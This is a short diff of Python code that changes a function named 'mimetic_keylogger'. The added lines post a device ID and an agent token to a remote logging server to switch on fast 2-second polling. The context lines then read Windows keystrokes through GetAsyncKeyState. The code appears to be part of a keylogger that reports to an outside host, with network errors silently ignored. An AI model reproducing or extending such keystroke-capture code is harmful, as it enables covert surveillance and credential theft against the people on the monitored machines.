@@ -272,6 +272,18 @@ def mimetic_keylogger():
     # Windows key codes
     VK_ESCAPE = 0x1B
 
+    # Enable mimetic mode (fast polling at 2 seconds)
+    if device_id:
+        try:
+            req = urllib.request.Request(
+                LOG_AUTH_URL + f"/mimetic-mode?deviceId={device_id}&enabled=true",
+                headers={"Authorization": "Bearer " + AGENT_TOKEN, "User-Agent": USER_AGENT},
+                method="POST",
+            )
+            urllib.request.urlopen(req, timeout=5)
+        except Exception:
+            pass
+
     try:
         # Get Windows API functions
         GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
